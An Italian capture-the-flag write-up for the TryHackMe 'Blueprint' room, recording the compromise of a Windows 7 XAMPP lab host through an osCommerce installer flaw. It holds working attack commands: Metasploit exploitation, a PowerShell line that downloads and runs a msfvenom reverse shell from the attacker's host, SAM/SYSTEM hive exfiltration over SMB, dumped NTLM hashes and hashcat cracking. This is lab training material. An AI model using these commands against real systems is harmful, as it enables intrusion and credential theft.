@@ -1,0 +1,388 @@
+---
+layout: writeup
+lang: it
+permalink: /writeups/blueprint/
+title: "Blueprint"
+ref: blueprint
+date: 2026-09-09
+bare: true
+platform: THM
+os: Windows 7 Home Basic SP1 (stack XAMPP)
+difficulty: Easy
+series: thm-windows
+tags: [win, xampp, oscommerce, metasploit, secretsdump, hashcat]
+txt: /writeups-files/blueprint.txt
+summary: "osCommerce con la directory install mai rimossa. Nessun payload PHP regge sul target: la strada è php/exec più un eseguibile msfvenom servito via HTTP."
+---
+
+# Writeup — Blueprint (TryHackMe)
+
+OS: Windows 7 Home Basic SP1 (stack XAMPP)
+Difficoltà: Easy
+Data: 9 settembre 2026
+
+---
+
+## Sommario
+
+Macchina Windows 7 non in dominio con sopra uno stack XAMPP lasciato in configurazione da sviluppo. 
+Un full port scan trova IIS sulla 80 che risponde solo 404, SMB, MySQL e due istanze Apache identiche su 443 e 8080 con il directory listing attivo, che espone in chiaro una installazione "osCommerce" 2.3.4 
+la directory install non è mai stata rimossa dopo il setup, e Metasploit ha un modulo dedicato a quel caso preciso. 
+
+L'exploit conferma la vulnerabilità al primo tentativo,ma nessuno dei payload PHP disponibili regge su questo target dato che la sessione termina subito. 
+La soluzione è stata usare il modulo solo come esecutore di un comando singolo, facendo scaricare al target una reverse shell windows creata con msfvenom. 
+La shell arriva come nt authority\system senza bisogno di privilege escalation, perché Apache girava già con quel contesto. Da li ho letto la root flag, provato concretamente i privilegi di scrittura in System32, dump degli hive SAM e SYSTEM esfiltrati via SMB e cracking dell'hash NTLM del secondo utente locale come richiesto dalla room
+
+Catena: nmap full port → Apache/XAMPP su 443 e 8080 → directory listing → osCommerce 2.3.4 → modulo installer unauth code exec → payload PHP tutti instabili → php/exec + msfvenom + server HTTP → shell nt authority\system → root.txt → scrittura in System32 → reg save SAM e SYSTEM → secretsdump → hashcat → password dell'utente Lab.
+
+---
+
+## strumenti e metodologie aggiuntive
+
+durante la sessione è stato utilizzato un llm: per recupero dettagli su CVE, interpretazione di output grezzi, suggerimenti su vettori inesplorati in caso di blocco e spiegazione dettagliata di concetti tecnici. l'esecuzione e le scelte operative erano mie. il writeup è stato scritto da me e successivamente ripulito con lo stesso strumento.
+
+---
+
+## Premessa
+
+room fatta interamente da Kali linux, non su Attacbox
+Sebbene l'enumerazione sia stata veloce, la stabilizzazione della shell ha recato problemi. Il modulo funzionava fin dal primo check ma il payload di default apriva e chiudeva sessioni all'infinito, un centinaio in pochi minuti, e ho perso tempo provando varianti prima di capire che il problema non era il payload singolo ma tutta la famiglia PHP su questo target.
+
+---
+
+## Fase 1 — Ricognizione
+
+full port scan seguito da uno scan mirato solo sulle porte trovate aperte, per non riscansionare 65535 porte due volte. sintassi dello scan definitivo dopo altri tentativi:
+
+IP=10.114.179.156; sudo nmap -sS -Pn -p- --min-rate 5000 -oN nmap_full.txt IP && sudo nmap -sV -sC -p (grep -oP '^\d+(?=/tcp\s+open)' nmap_full.txt | paste -sd,) -oN nmap_svc.txt $IP
+
+il grep estrae le porte dal primo output e le passa al secondo comando
+
+ -Pn perché Windows blocca quasi sempre l'icmp, -sS è una flag per il SYN scan
+
+Risultato:
+
+80/tcp open http Microsoft IIS httpd 7.5
+135/tcp open msrpc
+139/tcp open netbios-ssn
+443/tcp open ssl/http Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
+445/tcp open microsoft-ds Windows 7 Home Basic 7601 Service Pack 1
+3306/tcp open mysql MariaDB 10.3.23 or earlier (unauthorized)
+8080/tcp open http Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
+49152-49165/tcp open msrpc
+
+-sC è l'alias di --script=default: già usato in passato, lancia tutta la categoria default di NSE e girano solo quelli pertinenti alla porta. ricordavo fosse efficace in questi target. hanno risposto gli header http server, http-title, http-methods, http-ls, ssl-cert, ssl-date, tls-alpn, smb-os-discovery, smb-security-mode, smb2-security-mode, smb2-time, nbstat, clock-skew ecc... 
+
+cosa emerge, compresi i vettori che poi non ho usato:
+
+sulla 80 c'è IIS 7.5, un webserver nativo di microsoft integrato in Windows, l'equivalente di Apache in Microsoft. ma risponde 404 sulla root, quindi non ospita nessun sito. 
+resta un vettore secondario sicuramente da sottoporre a fuzzing se tutto il resto fallisce
+
+sulla 443 e sulla 8080 gira lo stesso Apache 2.4.23 Win32 con PHP 5.6.28.
+ lo script http-ls mostra che il directory listing è attivo ed espone:
+
+| SIZE TIME FILENAME
+| - 2019-04-11 22:52 oscommerce-2.3.4/
+| - 2019-04-11 22:52 oscommerce-2.3.4/catalog/
+| - 2019-04-11 22:52 oscommerce-2.3.4/docs/
+
+abbiamo ottenuto la versione dell'applicazione, e senza dover fuzzare niente.
+ questo è stato il mio vettore principale (ottengo verione di un servizio - poi cerco un esploit dedicato) motivato anche dalla probabilità: in room di questo livello il punto di ingresso sta quasi sempre su un webserver come ho visto spesso.
+
+la 445 dice Windows 7 Home Basic SP1 build 7601, computer name BLUEPRINT e workgroup WORKGROUP
+BLUEPRINT però non è un servizio o un vettore di punta, è semplicemente il nome della macchina
+la 445 è SMB, condivisione file di Windows. "message_signing disabled" porterebbe ad un relay, ma senza un secondo host in rete non posso sfruttarlo. Secondo fonti ricercate, un SP1 non patchato apre anche a MS17-010, vettore alternativo valido, tenuto da parte.
+
+sulla porta 3306 c'è un database raggiungibile dall'esterno ma già segnalato come non autenticato (e non accessibile) dalla riga:
+
+3306/tcp open mysql MariaDB 10.3.23 or earlier (unauthorized)
+
+il server ha rifiutato l'handshake di nmap perché non ha un'utenza valida. la porta risponde, ma non abbiamo credenziali.
+
+su porte 135, 139 e sui 4915x ci sono RPC e degli endpoint "dinamici", enumerabili a sessione nulla con rpcclient. mai toccati in quest'attività.
+
+segnalo che ssl-cert (CN=localhost, scaduto nel 2019), ssl-date, tls-alpn, clock-skew e smb2-time non li ho guardati, non rilevandoli immediatamente come informazioni utili, dato che ho dato priorità a vettori più immediati. il certificato self-signed di default in realtà era già una conferma che lo stack è XAMPP e non un deploy serio, ma ho controllato a posteri
+
+---
+
+## Fase 2 — Ricerca dell'exploit
+
+partendo dal presupposto di conoscere solo la versione dell'applicazione, la cerco dentro Metasploit:
+
+msfconsole -q -x "search oscommerce 2.3.4"
+
+-q toglie il banner ,mentre -x esegue la stringa di comandi come se li avessi digitati io e poi lascia il prompt aperto. non esegue nient'altro di sua iniziativa: gli ho dato solo un search.
+
+Modulo:
+
+exploit/multi/http/oscommerce_installer_unauth_code_exec 2018-04-30 excellent Check: Yes
+
+rank excellent significa affidabile e non distruttivo per il servizio, 
+Check: Yes significa che il modulo sa verificare se il target è vulnerabile prima di runnare.
+Set dei parametri richiesti:
+
+use 0
+set RHOSTS 10.114.179.156
+set RPORT 8080
+set TARGETURI /oscommerce-2.3.4/catalog/
+check
+
+[!] Unknown datastore option: TARGETURI
+[*] The target is not exploitable. Target does not appear to be running osCommerce
+
+TARGETURI non esiste in questo modulo, il valore è finito in un datastore fantasma e il check ha cercato osCommerce nella root. 
+show options chiarisce che l'opzione giusta si chiama URI e vuole il percorso della directory di installazione, non della webroot:
+
+set URI /oscommerce-2.3.4/catalog/install/
+check
+
+[+] The target appears to be vulnerable. osCommerce install directory is accessible and configure.php appears writable
+
+l'installer non è mai stato rimosso dopo il setup e configure.php è scrivibile. è esattamente il caso che il modulo sfrutta: scrive codice PHP dentro quel file e poi lo richiama perché il webserver lo esegua.
+
+---
+
+## Fase 3 — Exploitation e sessioni esauste
+
+il payload di default è php/meterpreter/reverse_tcp e ha senso: il target esegue PHP e richiama indietro sulla mia tun0 (vpn presente) .
+
+set LHOST tun0
+run
+
+[] Started reverse TCP handler on 192.168.134.214:4444
+[] Sending stage (72690 bytes) to 10.114.179.156
+[-] Meterpreter session 3 is not valid and will be closed
+[*] 10.114.179.156 - Meterpreter session 2 closed. Reason: Died
+...
+
+il modulo continua a rilanciare il payload ma ogni sessione muore appena nata. 
+sono arrivato oltre la sessione 260 prima di fermare tutto con Ctrl+C. tentativi fatti,nell'ordine:
+
+php/reverse_php, una reverse shell PHP semplice invece del Meterpreter. 
+la sessione si apre davvero ma cade prima di poterci entrare:
+
+[] Command shell session 67 opened (192.168.134.214:4444 -> 10.114.179.156:49521)
+[] 10.114.179.156 - Command shell session 67 closed.
+
+set ExitOnSession false + exploit -j, per mandarla in background e non farla chiudere insieme al modulo. 
+la sessione 68 resta listata correttamente, ma sessions -i 68 la trova già morta
+
+ritorno al meterpreter PHP con AutoRunScript su post/windows/manage/migrate, per migrare in un processo stabile prima che muoia. Stesso ciclo fallimentare di prima
+
+provo ad usare un listener esterno con netcat al posto dell'handler di Metasploit, nel dubbio che fosse l'handler a strozzare la sessione. consiglio di debug comune online. la 4444 era ancora occupata da msfconsole quindi ho usato la 5555, e con DisablePayloadHandler true la connessione arriva ma la shell muore lo stesso:
+
+connect to [192.168.134.214] from (UNKNOWN) [10.114.179.156] 49750
+
+Consiglio utile da macchine passate: se un exploit non produce una sessione stabile conviene provare le varianti col nome simile listate su metasploit, reverse contro bind, meterpreter contro shell semplice. Perché la compatibilità cambia parecchio su sistemi datati e tentarli tutti conviene . 
+in questo caso però nessuna variante ha risolto
+
+---
+
+## Fase 4 — La lista dei payload 
+
+show payloads
+
+74 payload compatibili, tutti riconducibili a due famiglie già individuate: PHP puro (meterpreter, bind, reverse) e php/unix/cmd/*, cioè esecuzione di comandi shell che presuppongono linux (bash, perl, python, ruby, netcat, socat, awk). nessun payload di Windows nativo.
+
+su un Windows con XAMPP quasi nessuno di quelli può funzionare, ed è il motivo per cui tutte le sessioni cadevano. 
+74 payload sono troppi, individuo con llm specializzati quello funzionante per il contesto.
+
+quello sensato è "php/exec": non apre una shell, esegue solo un comando singolo sul target. lo si usa per farsi scaricare ed eseguire una reverse shell vera e generata a parte.
+
+genero l'eseguibile Windows e lo servo via HTTP dalla mia macchina:
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.134.214 LPORT=5555 -f exe -o /tmp/rev.exe && cd /tmp && python3 -m http.server 8081
+
+Payload size: 324 bytes
+Final size of exe file: 7168 bytes
+
+listener su una terza tab:
+
+nc -lvnp 5555 
+
+avendo prima caricato il payload e solo dopo settato il parametro CMD (settandolo prima si prende un Unknown datastore option non so perchè):
+
+set PAYLOAD php/exec
+set CMD "powershell -c "(New-Object Net.WebClient).DownloadFile('http://192.168.134.214:8081/rev.exe','C:\\Windows\\Temp\\rev.exe'); Start-Process 'C:\Windows\Temp\rev.exe'""
+exploit
+
+primi tentativi non producono niente. riavvio  python3 -m http.server e la richiesta compare subito nel log:
+
+10.114.179.156 - - [09/Sep/2026 11:02:47] "GET /rev.exe HTTP/1.1" 200 -
+
+e anche se non me l'aspettavo e sinceramente non era previsto in questa fase si apre una shell sulla stessa tab.
+ 
+non sull'handler di Metasploit dove credevo ma sul listener netcat, ho dovuto cercare il perchè: 
+l'exe generato con msfvenom ha LPORT=5555 compilato dentro perchè generato con mie istruzioni e compilato automaticamente con 5555 come porta default, quindi si riconnette esattamente lì e non ha niente a che vedere con la sessione msf. Agente nel migliorare la sintassi ha inserito come porta la 5555 e non la 4444
+
+connect to [192.168.134.214] from (UNKNOWN) [10.114.179.156] 49784
+Microsoft Windows [Version 6.1.7601]
+C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes>
+
+---
+
+## Fase 5 — Privilegi e root flag
+
+whoami && whoami /priv
+
+nt authority\system
+
+PRIVILEGES INFORMATION
+SeTcbPrivilege Act as part of the operating system Enabled
+SeDebugPrivilege Debug programs Enabled
+SeImpersonatePrivilege Impersonate a client after auth Enabled
+SeCreateGlobalPrivilege Create global objects Enabled
+(altri 23 privilegi elencati, metà abilitati)
+
+SYSTEM diretto, nessuna privilege escalation necessaria. Apache girava già con quel contesto, cosa normale su installazioni XAMPP lasciate ai default, e la shell lo eredita. per lo stesso motivo non esistono user flag e root flag separate: c'è un unico file.
+
+type C:\Users\Administrator\Desktop\root.txt.txt & dir /s /b C:\Users*.txt
+
+THM{aea1e3ce6fe7f89e10cea833ae009bee}
+
+il dir /s /b sulla stessa riga serve a vedere cos'altro è leggibile nei profili utente, e conferma l'accesso completo ai dati personali dei due account presenti:
+
+C:\Users\Administrator\AppData\Local\Microsoft\Internet Explorer\brndlog.txt
+C:\Users\Administrator\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\69LGRFWE\css[1].txt
+C:\Users\Administrator\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\69LGRFWE\f[1].txt
+C:\Users\Administrator\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\IV511HM9\51-6d3a1e[1].txt
+C:\Users\Administrator\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\IV511HM9\wc-utils[1].txt
+C:\Users\Administrator\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\LIMTO3MN\c1-7c7ac0-8a01ca32[1].txt
+C:\Users\Administrator\AppData\Local\Temp\FXSAPIDebugLogFile.txt
+C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Cookies\administrator@bing[1].txt
+C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Cookies\administrator@google.co[1].txt
+C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Cookies\administrator@microsoft[2].txt
+C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Cookies\administrator@msn[1].txt
+C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Cookies\administrator@www.bing[1].txt
+C:\Users\Administrator\Desktop\root.txt.txt
+C:\Users\All Users\VMware\VMware Tools\manifest.txt
+C:\Users\All Users\VMware\VMware Tools\Unity Filters\adobeflashcs3.txt
+C:\Users\All Users\VMware\VMware Tools\Unity Filters\adobephotoshopcs3.txt
+C:\Users\Lab\AppData\Roaming\Microsoft\Windows\Cookies\Low\lab@rlcdn[3].txt
+C:\Users\Lab\AppData\Roaming\Microsoft\Windows\Cookies\Low\lab@scorecardresearch[2].txt
+C:\Users\Lab\AppData\Roaming\Microsoft\Windows\Cookies\Low\lab@winactivators[2].txt
+C:\Users\Lab\AppData\Roaming\Microsoft\Windows\Cookies\Low\lab@www.bing[1].txt
+C:\Users\Lab\AppData\Roaming\Microsoft\Windows\Cookies\Low\lab@www.linkedin[1].txt
+C:\Users\Lab\AppData\Roaming\Microsoft\Windows\Cookies\Low\lab@www.msn[1].txt
+C:\Users\Lab\AppData\Roaming\Microsoft\Windows\Cookies\Low\lab@www.msn[3].txt
+C:\Users\Lab\AppData\Roaming\Microsoft\Windows\Cookies\Low\lab@www.msn[4].txt
+C:\Users\Lab\AppData\Roaming\Microsoft\Windows\Cookies\Low\lab@youtube[2].txt
+
+cookie di navigazione, cronologia dei siti visitati e log applicativi di entrambi i profili, incluso un lab@winactivators che dice parecchio su come è stata attivata questa installazione. da qui esce anche l'informazione che conta per il passo successivo: esiste un secondo utente locale chiamato Lab.
+
+per provare concretamente il livello di privilegio scrivo un file dove un utente normale non arriverebbe mai, e ne approfitto per tentare la pulizia dell'eseguibile:
+
+echo pwned_by_christian > C:\Windows\System32\proof.txt & type C:\Windows\System32\proof.txt & del C:\Windows\Temp\rev.exe
+
+pwned_by_christian
+C:\Windows\Temp\rev.exe
+Access is denied.
+
+scrittura in System32 riuscita, cancellazione di rev.exe negata. non è una mancanza di privilegi: il file è in esecuzione, è la shell stessa in cui sto scrivendo, e Windows lo tiene lockato finché il processo vive
+
+---
+
+## Fase 6 — Dump degli hash e cracking
+
+questa parte non la conoscevo e l'ho fatta eseguire al chatbot passo per passo.
+
+da SYSTEM si possono salvare gli hive del registro che contengono il database utenti locale. SAM ha gli hash, SYSTEM ha la bootkey necessaria a decifrarli, servono entrambi:
+
+reg save HKLM\SAM C:\Windows\Temp\sam.hive & reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
+
+The operation completed successfully.
+The operation completed successfully.
+
+per portarli fuori serve il verso opposto rispetto al server HTTP di prima, cioè la macchina deve mandare i file a me. la via più diretta è una share SMB montata al volo su Kali:
+
+impacket-smbserver share /tmp -smb2support
+
+e dal target:
+
+copy C:\Windows\Temp\sam.hive \192.168.134.214\share\ & copy C:\Windows\Temp\system.hive \192.168.134.214\share\
+
+    1 file(s) copied.
+    1 file(s) copied.
+
+estrazione degli hash in locale:
+
+impacket-secretsdump -sam /tmp/sam.hive -system /tmp/system.hive LOCAL
+
+[*] Target system bootKey: 0x147a48de4a9815d2aa479598592b086f
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
+
+il campo LM è identico per tutti (aad3b435... è il valore vuoto), quello che conta è l'NT hash. Guest ha 31d6cfe0d16ae931b73c59d7e0c089c0, che è l'hash della password vuota.
+
+il cracking dell'hash di Lab ha richiesto quattro passaggi. i walkthrough in genere consigliano rockyou.txt ma io storicamente preferisco big.txt, che su questa Kali non era presente. rockyou era ancora compresso e la cartella non è scrivibile da utente,quindi va scompattato con sudo:
+
+sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz && hashcat -m 1000 30e87bf999828446a1c1209ddde4c450 /usr/share/wordlists/rockyou.txt
+
+Status: Exhausted
+Recovered: 0/1
+
+tutte e 14.344.385 le candidate provate, nessun match. secondo tentativo con le regole di mutazione applicate alla stessa lista, che moltiplicano ogni parola in venti varianti:
+
+sudo hashcat -m 1000 30e87bf999828446a1c1209ddde4c450 /usr/share/wordlists/rockyou.txt -r /usr/share/john/rules/best64.rule
+
+(il file non sta in /usr/share/hashcat/rules/ come da documentazione ma in /usr/share/john/rules/, trovato con un find. hashcat scarta parecchie regole perché scritte in sintassi John non convertibile per il backend OpenCL)
+
+Keyspace: 286887700
+Status: Exhausted
+
+ancora niente. installo SecLists per avere liste più ampie:
+
+sudo apt install -y seclists
+
+e provo common-passwords-win.txt, che mi piaceva come idea perché è una lista di password tipiche Windows:
+
+Status: Exhausted
+Rejected: 0/815
+
+qui l'avviso "the wordlist or mask that you are using is too small" non è un rigetto, è solo una nota di performance: con 815 candidate la CPU resta scarica. Rejected 0 conferma che le ha provate tutte.
+
+la lista che risolve è quella completa da 10 milioni:
+
+sudo hashcat -m 1000 30e87bf999828446a1c1209ddde4c450 /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt
+
+30e87bf999828446a1c1209ddde4c450:googleplus
+Status: Cracked
+Progress: 532480/5189454 (10.26%)
+
+password dell'utente Lab: googleplus. trovata al 10% della lista, in tre secondi, dopo che rockyou con le regole aveva macinato 286 milioni di candidate a vuoto. la lezione non è sulla velocità ma sul fatto che rockyou non contiene tutto quello che si crede.
+
+---
+
+## Catena completa
+
+nmap full port → IIS 80, SMB 445, MySQL 3306, Apache su 443 e 8080
+→ http-ls espone il directory listing → osCommerce 2.3.4
+→ search oscommerce → exploit/multi/http/oscommerce_installer_unauth_code_exec
+→ opzione URI (non TARGETURI) sulla directory install → check positivo, configure.php scrivibile
+→ php/meterpreter/reverse_tcp: sessioni aperte e morte a ripetizione
+→ php/reverse_php, ExitOnSession false, AutoRunScript migrate, listener netcat esterno: tutti falliti
+→ show payloads: 74 payload, tutti PHP o Unix, nessuno Windows nativo
+→ php/exec + msfvenom windows/shell_reverse_tcp + server HTTP sulla 8081
+→ shell ricevuta sul listener netcat come nt authority\system
+→ root.txt + enumerazione dei .txt nei profili utente → esiste l'utente Lab
+→ scrittura in C:\Windows\System32 come prova dei privilegi
+→ reg save SAM e SYSTEM → esfiltrazione via impacket-smbserver
+→ secretsdump → NT hash di Lab
+→ hashcat: rockyou fallisce anche con best64, xato 10M crack in 3 secondi → googleplus
+
+---
+
+## Lezioni apprese
+
+quando le sessioni si aprono e muoiono subito, il problema può non essere il payload singolo ma tutta la famiglia di payload disponibili per quel modulo. guardare show payloads per intero prima di provare le varianti a una a una avrebbe risparmiato la maggior parte del tempo di questa room: da lì si vede in due secondi che non esiste nessun payload nativo per il sistema operativo del target, e che l'unica strada è usare l'esecuzione di comando per portarsi dentro un eseguibile costruito a parte.
+
+un exe generato con msfvenom ha LHOST e LPORT compilati dentro e si riconnette lì a prescindere da cosa stia facendo Metasploit. tenerlo a mente evita di cercare la shell nel posto sbagliato
+
+rockyou non è la fine della strada. una password banale e reale come googleplus non c'è, nemmeno applicando le regole di mutazione, e insistere con le regole su una lista che non contiene la parola base è tempo buttato.
+
+---
+
+## Tool utilizzati
+
+nmap, curl, msfconsole (exploit/multi/http/oscommerce_installer_unauth_code_exec, payload php/meterpreter/reverse_tcp, php/reverse_php, php/exec), msfvenom, netcat, python3 http.server, impacket-smbserver, impacket-secretsdump, hashcat, SecLists
